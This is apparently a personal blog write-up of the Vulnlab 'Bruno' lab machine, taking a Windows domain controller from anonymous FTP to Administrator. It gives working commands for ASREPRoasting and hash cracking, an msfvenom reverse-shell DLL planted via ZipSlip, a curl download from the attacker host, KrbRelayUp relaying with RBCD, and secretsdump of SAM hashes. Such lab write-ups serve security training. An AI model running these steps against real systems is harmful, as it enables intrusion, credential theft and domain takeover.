---
title: Bruno - Vulnlab
date: 2024-08-02 16:33:03
tags: [vulnlab, Medium]
categories: vulnlab
keywords: 'Vulnlab, Medium, Windows'
description: Bruno is one of the more difficult AD machines that I've done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.
cover: /images/vulnlab/bruno-vl/bruno_slide.png
top_img: /images/cyberpunk-red.jpg
toc: true
toc_number: false
---

Bruno is one of the more difficult AD machines that I've done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.

You may see the IP update a few times, I did the box multiple times during the writeup portion.

# Enumeration

We'll first start with our usual NMAP scan.

```
└─$ sudo nmap 10.10.126.214
[sudo] password for daz:
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 23:18 EDT
Nmap scan report for 10.10.126.214
Host is up (0.12s latency).
Not shown: 984 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi

Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds
```

Given the usual ports that for AD (Kerberos, SMB, LDAP) there are a few outliers in our scan, such as FTP and HTTP (more so FTP).

We'll first start by verifying anonymous logon through FTP.

![](/images/vulnlab/bruno-vl/b.png)

It seems that we were able to login with null credentials, and there seem to be a few directories for us to look through. We'll come back to this later, as I want to do my initial checks around the AD machine just to see if we are missing anything.

Let's take a look at the web server to see if there's anything we can find.

![](/images/vulnlab/bruno-vl/c.png)

This looks to be a default IIS webpage, and running directory traversal scans on this webpage did not present me with any endpoints.

```
└─$ gobuster dir -u http://10.10.126.214 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx
```

In that case we'll take a look at SMB to see if there are any shares that we can access.

```
└─$ smbclient -L 10.10.126.214 -N
Anonymous login successful

Sharename       Type      Comment
---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

It seems that anonymous login is allowed, however we don't have any permissions to view any shares at the moment. We'll most likely need credentials in order to do anything with SMB.

Finally, we'll take a look at LDAP to see if null authentication is allowed (which would allow us to dump domain objects from the domain). We'll need to find the name of the domain, to which we can do with a simple CME command.

```
└─$ crackmapexec smb 10.10.126.214
SMB         10.10.126.214     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)
```

Now that we have the name of the DC along with the workstation, we'll add it to our `/etc/hosts` file and run LDAPSEARCH against it.

```
└─$ ldapsearch -x -H ldap://brunodc.bruno.vl -D '' -w '' -b "DC=bruno,DC=vl"
# extended LDIF
#
# LDAPv3
# base <DC=bruno,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# search result
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera
 tion a successful bind must be completed on the connection., data 0, v4f7c

# numResponses: 1
```

It seems that we'll also need credentials to access LDAP.

# Foothold with FTP

Given that most of our initial access vectors don't seem to bare much fruit, let's take a look back at FTP to see if there's anything we can find.

![](/images/vulnlab/bruno-vl/d.png)

If you'll notice, there seems to be files related to a `SampleScanner` app within the FTP directory. We've dealt with DLL Hijacking in applications that we have write access to in the past, so this could be a similar situation (specifically for [Trusted](https://dan-feliciano.com/2024/06/05/trusted/)).

The only issue is that we do not have write access onto this directory at the moment.

```
ftp> ls
229 Entering Extended Passive Mode (|||49561|)
150 Opening ASCII mode data connection.
06-29-22  05:42PM                  165 changelog
06-28-22  07:15PM                  431 SampleScanner.deps.json
06-29-22  03:58PM                 7168 SampleScanner.dll
06-29-22  03:58PM               174592 SampleScanner.exe
06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json
06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json
226 Transfer complete.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49562|)
550 Access is denied.
ftp>
```

While we don't have write access currently, we do have read access. Let's pull the entirety of this folder back to our localhost to see if there's any important files we can read (specifically changelog).

NOTE: Remember to set your FTP session to "binary" mode before you download all of the files. This just makes sure to change all of the downloads from ASCII to Binary, which will convert the `SampleScanner.exe` to an MS-DOS which we won't be able to debug later. You can do so easily by typing `binary` into the FTP console.

```
└─$ cat changelog
Version 0.3
- integrated with dev site
- automation using svc_scan

Version 0.2
- additional functionality

Version 0.1
- initial support for EICAR string
```

It seems that there are a few changes implemented on the development side for the `SampleScanner` app itself. The functionality seems to be integrated with a development site and included better support.

That being said, we do seem to also have an account name that we can potentially try to exploit - `svc_scan`. Let's do our Kerberos checks for this user along with the other default accounts.

```
└─$ impacket-GetNPUsers -dc-ip 10.10.126.214 -request -usersfile ul.txt -no-pass bruno.vl/'daz'@10.10.126.214
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
$krb5asrep$23$svc_scan@BRUNO.VL:cc4e0a77789388e39[...snip...]2be71ab6dd19a97dcc49c6
```

We were successfully able to perform an ASREPRoasting attack against `svc_scan`, meaning we can try and crack this encrypted ASREP ticket for a plaintext password. Our hash identifier is 18200, as you can find [here](https://hashcat.net/wiki/doku.php?id=example_hashes).

```
└─$ hashcat -a 0 -m 18200 svc_scan.txt /usr/share/wordlists/rockyou.txt
......
b6252092fb9116194a8add89f17392c2be71ab6dd19a97dcc49c6:[...snip...]

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
```

As you can see, we were able to crack the ASREP hash and now have the plaintext password for `svc_scan`.

There are a few things we could do here, such as dumping the domain (given that these are LDAP credentials) or look at SMB/FTP to further our foothold.

To dump the domain, we'll do the following with the [Bloodhound Python ingestor](https://github.com/dirkjanm/BloodHound.py). If you haven't set up Bloodhound before, [this resource](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux) should be helpful for you.

```
└─$ bloodhound-python -d 'bruno.vl' -u 'svc_scan' -p '[...snip...]' -c all -ns 10.10.126.214 --zip
```

You should then be able to import the compressed domain object archive into Bloodhound to view all the domain objects within LDAP.

![](/images/vulnlab/bruno-vl/e.png)

It does not seem as though our user has any obscenely prevalent privileges, so we'll have to look elsewhere.

Let's have a look at SMB given that we have credentials to a legitimate user now.

```
└─$ smbclient -L 10.10.126.214 -U 'svc_scan'
Password for [WORKGROUP\svc_scan]:

Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
CertEnroll      Disk      Active Directory Certificate Services share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
queue           Disk
SYSVOL          Disk      Logon server share
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

You'll notice that we now have access to a decent amount of SMB shares, though there is an interesting one that we can see currently. There seems to be a share called `queue`, which if you'll remember, is similar to the name of a directory that we found in FTP.

```
└─$ smbclient \\\\10.10.126.214\\queue -U 'svc_scan'
Password for [WORKGROUP\svc_scan]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jun 29 12:33:48 2022
  ..                                  D        0  Wed Jun 29 09:41:03 2022

7863807 blocks of size 4096. 3739137 blocks available
smb: \> put test.txt
putting file test.txt as \test.txt (0.0 kb/s) (average 0.0 kb/s)
smb: \>
```

If you'll also notice, we have write access onto this share as well.

There aren't many other leads - given that we do not have access to any other users at the moment or access to any other services that would be of use to us. The other SMB directories don't seem to hold anything either, as I made sure to enumerate other parts of the machine to make sure I didn't miss anything.

# Reverse Engineering SampleScanner

At this point, I decided to take a look back at the SampleScanner application to see if we could perform any DLL Hijacking. This is mainly just due to the notion of a DLL and the fact that this application seems to be a custom executable as I could not find source code for it anywhere.

Let's first start by opening ProcMon via the [SysInternalsSuite](https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite). Navigate to `Filter > Filter` (or just Ctrl+L), and use the configuration as seen below.

* Process Name - begins with - SampleScanner -> then Include
* Path - ends with - .dll -> then Include
* Result - begins with - NAME -> then Include

![](/images/vulnlab/bruno-vl/f.png)

We'll then apply the filters and ProcMon will start listening to events that fall under our filter settings. Run the binary and you should see some events populate.

![](/images/vulnlab/bruno-vl/g.png)

You'll get a lot of results, so I've highlighted two important entries that get logged into ProcMon. The two highlights I have are DLLs that are not found within the current directory. The key note here is that they are DLLs that are within the **current directory**, meaning it will be using the same directory that the `SampleScanner` application is within.

This means we can plant a malicious DLL into the same directory as application and it should execute it, giving us a reverse shell.  But that being said, how can we do so and how do we know what the application is actually doing?

Before that, I want to note that the executable spits out an error if you run it properly.

```
PS Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali-linux\home\daz\tech\bruno\scanner\SampleScanner> .\SampleScanner.exe
Unhandled exception. System.IO.DirectoryNotFoundException: Could not find a part of the path 'C:\samples\queue'.
   at System.IO.Enumeration.FileSystemEnumerator`1.CreateDirectoryHandle(String path, Boolean ignoreNotFound)
   at System.IO.Enumeration.FileSystemEnumerator`1.Init()
   at System.IO.Enumeration.FileSystemEnumerator`1..ctor(String directory, Boolean isNormalized, EnumerationOptions options)
   at System.IO.Enumeration.FileSystemEnumerable`1..ctor(String directory, FindTransform transform, EnumerationOptions options, Boolean isNormalized)
   at System.IO.Enumeration.FileSystemEnumerableFactory.UserFiles(String directory, String expression, EnumerationOptions options)
   at System.IO.Directory.InternalEnumeratePaths(String path, String searchPattern, SearchTarget searchTarget, EnumerationOptions options)
   at SampleScanner.Program.Main(String[] args)
```

The key thing to look at here is that it seems that a static file path is being searched, the `C:\samples\queue` directory. This is interesting because we have write access to this folder via SMB as `svc_scan`.

To start with reversing the binary itself, we can first examine the `SampleScanner.dll` to see specifically what the executable is doing as this DLL is more than likely associated with the main functionality of the application. We can do so with [ILSpy](https://github.com/icsharpcode/ILSpy), a reverse engineering decompiler used for examining application source code. We'll import the `SampleScanner.dll` into ILSpy.

![](/images/vulnlab/bruno-vl/h.png)

We're mainly concerned with the Main function inside of the original `SampleScanner` library that is decompiled. 

In the screenshot above, you'll notice that there are various hints about a "ZipArchive" entry as a class within the main source code. Let's take a look farther into these classes to see if there's anything we can find.

![](/images/vulnlab/bruno-vl/i.png)

Looking into those classes, it looks like the zip archive is opening the archive itself with `GetEntry` and `get_ArchiveReader`. These contents are then scanned by the application itself to simulate a malware scan.

So from reverse engineering the binary we discovered three things:
* A DLL using the relative path of the binary is not being loaded
* The application itself is attempting to open any archives within a specified directory.
* The specified directory itself, `C:\samples\queue`, is a directory that we have write access onto.

After doing some research into what we have in front of us, I came across an interesting exploit that seems to fit our situation - the ZipSlip.

# DLL Hijacking via ZipSlip

[ZipSlip](https://security.snyk.io/research/zip-slip-vulnerability) is essentially a vulnerability that allows us to perform file creation via path traversal in a zip archive. If a zip archive is opened automatically by a program, we can create a compressed archive with a file that has path traversal characters in its name, such as `../revshell.exe`. This will place our executable in the parent folder of where it was opened.

In our case, we want to place a malicious executable in `../app/(malicious_file_here)`. This should be within the same path as the binary, which is where the application is trying to load DLLs from.

Since we know the names of the DLL that are not found within the application's direct path, we can use those as the names for our malicious DLLs. We can craft a malicious DLL using `msfvenom`, as seen below and then convert it to a zip archive. You can use either `hostfxr.dll` or `Microsoft.DiaSymReader.Native.amd64.dll`, as either will work for this.

```
└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=10.8.0.173 LPORT=9001 > hostfxr.dll            
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of dll file: 9216 bytes

└─$ zip host.zip hostfxr.dll
  adding: hostfxr.dll (deflated 80%)
```

We can then use an archive manager such as 7-Zip File Manager (in my case I transferred the DLL to my Windows host) to view the archive and edit the name accordingly.

![](/images/vulnlab/bruno-vl/j.png)

As seen above, you can implement directory traversal characters in 7-Zip without any issues. This will create two mock directories within the archive, which will be the traversal method when we transfer it to the target machine.

Now that we have the respective archive set up, let's start up our listener and transfer the archive to the `queue` share. (Note that I changed the name of the archive to `host_sample.zip`)

![](/images/vulnlab/bruno-vl/k.png)

After some time as you'll see, the ZipSlip exploit worked properly and the DLL was moved to the `app` directory. After about a minute or so, you'll see that our reverse shell called back and we now should have a session as `svc_scan`.

![](/images/vulnlab/bruno-vl/l.png)

# Internal Enumeration

Now that we have a session on the remote host, we'll do a bit of enumeration on the domain computer to see if there are any ways to escalate our privileges.

The root `C:\` drive contains the first user flag as seen below.

```
PS C:\> ls

Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/19/2021   6:24 AM                EFI
d-----         6/29/2022   2:43 PM                inetpub
d-----          5/8/2021   8:20 AM                PerfLogs
d-r---         6/29/2022   4:15 PM                Program Files
d-----         6/29/2022   1:28 PM                Program Files (x86)
d-----         6/29/2022   1:41 PM                samples
d-r---         6/29/2022   4:09 PM                Users
d-----         6/29/2022   1:32 PM                Windows
-a----         6/29/2022   3:00 PM             37 user.txt
```

There does seem to be an `inetpub` directory which contains the default IIS website that we saw previously, however we do not have write access to this part of the system meaning we won't be able to exploit it.

Furthermore, there does not seem to be any outstanding program applications on the internal machine that we can exploit, nor any services that are running on an internal port.

At this point, I decided to see if an internal machine scraper such as [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS). This should tell us if there are any hidden vulnerabilities that we wouldn't be able to see from an initial glance. 

```
PS C:\temp> curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe
curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe
PS C:\temp> .\winPEASany_ofs.exe
......
Checking KrbRelayUp
  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup
  The system is inside a domain (BRUNO) so it could be vulnerable.
  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges
```

As you'll notice, this should spider the entire filesystem and report any vulnerabilities back to us. The above vulnerability is reported often when I run WinPEAS, however there was something interesting that I found that may we may be able to exploit.

# Privilege Escalation via KrbRelayUp/CLSIDs

One thing you'll notice is that our user currently has a MAQ of 10. A MAQ, or MachineAccountQuota, essentially allows the domain object to create domain computer objects and use them within the domain.

```
└─$ nxc ldap 10.10.73.8 -u 'svc_scan' -p '[...snip...]' -M maq
SMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   
LDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\svc_scan:[...snip...]
MAQ         10.10.73.8      389    BRUNODC          [*] Getting the MachineAccountQuota
MAQ         10.10.73.8      389    BRUNODC          MachineAccountQuota: 10
```

Furthermore, the LDAP does not have signing enabled. This cements the fact that a Kerberos relay attack is possible through KrbRelayUp.

```
└─$ nxc ldap 10.10.73.8 -u 'svc_scan' -p '[...snip...]' -M ldap-checker
SMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   
LDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\svc_scan:[...snip...]
LDAP-CHE... 10.10.73.8      389    BRUNODC          LDAP Signing NOT Enforced!
LDAP-CHE... 10.10.73.8      389    BRUNODC          LDAPS Channel Binding is set to "NEVER"
```

A Kerberos relay attack is essentially an authentication attack much like NTLM relay that allows us to relay a domain objects Kerberos authentication to another service. This essentially allows us to relay an ASREQ to any SPN that we need to authenticate to. Where LDAP signing essentially plays a picture into this is that it will encrypt all traffic over LDAP, meaning we won't be able to properly sniff the traffic for authentication tokens as a MITM. If you want to delve into more information about Kerberos Relaying and how it works, [this](https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html) was the blog post I used mainly as research into the topic.

In our case, we should be able to create a fake domain computer object and coerce an authentication attempt using RBCD. The only issue is, how do we do coerce authentication if we're using Kerberos authentication? This is where the idea of abusing [CLSIDs](https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.) comes into play, as CLSIDs are essentially identifiers for application components in Windows. These are predefined by the Windows operating system, meaning we can use a curated list [here](https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt) or [here](https://vulndev.io/cheats-windows/). We're specifically looking for one that works with Windows Server 2019/2022, as that is the current operating system that we're on.

In particular, the CLSID I picked was `d99e6e73-fc88-11d0-b498-00a0c90312f3`. We'll need to compile [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp.git) in order to exploit this on the target machine. Luckily enough, Defender is not enabled on this box so we shouldn't have to bypass AV for this.

```
PS C:\temp> "Invoke-Mimikatz"
"Invoke-Mimikatz"
Invoke-Mimikatz
```

So once we have the `KrbRelayUp` binary compiled, we'll execute it on the target machine using the CLSID that we have selected.

```
PS C:\temp> .\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3
.\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3
KrbRelayUp - Relaying you to SYSTEM


[+] Rewriting function table
[+] Rewriting PEB
[+] Init COM server
[+] Computer account "daz$" added with password "Password123@"
[+] Looking for available ports..
[+] Port 2869 available
[+] Register COM server
[+] Forcing SYSTEM authentication
[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
[+] LDAP session established
[+] RBCD rights added successfully
[+] Run the spawn method for SYSTEM shell:
./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn daz$ -cp Password123@
```

We'll then execute the command provided so that a TGT request can be sent to the KDC. This allows us to use `getST` after this command to retrieve a TGS on behalf of the Administrator account to CIFS using our fake machine account.

```
└─$ impacket-getST -spn cifs/brunodc.bruno.vl -impersonate Administrator -dc-ip 10.10.116.111 bruno.vl/'daz$':'Password123@'
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache
```

We'll then dump the secrets of the machine using `secretsdump`.

```
└─$ export KRB5CCNAME=Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache

└─$ impacket-secretsdump -k brunodc.bruno.vl                                                                       
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
......
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13735[...snip...]bfd4:::
```

Now that we have the Administrator's NT hash, we can use that to login to WinRM.

![](/images/vulnlab/bruno-vl/m.png)

Now that we are currently the Administrator, we can read the root flag within the Administrator's Desktop directory. That means we have successfully rooted this machine!

# Conclusion

This machine was very difficult, and it gave me some new insight on doing more RBCD exploitation. DLL Hijacking and reverse engineering are both topics that this machine covered well, and I have no complaints. Big thanks to xct for this machine.

# Resources

https://hashcat.net/wiki/doku.php?id=example_hashes
https://github.com/dirkjanm/BloodHound.py
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux
https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
https://github.com/icsharpcode/ILSpy
https://security.snyk.io/research/zip-slip-vulnerability
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html
https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.
https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt
https://vulndev.io/cheats-windows/
https://github.com/Dec0ne/KrbRelayUp



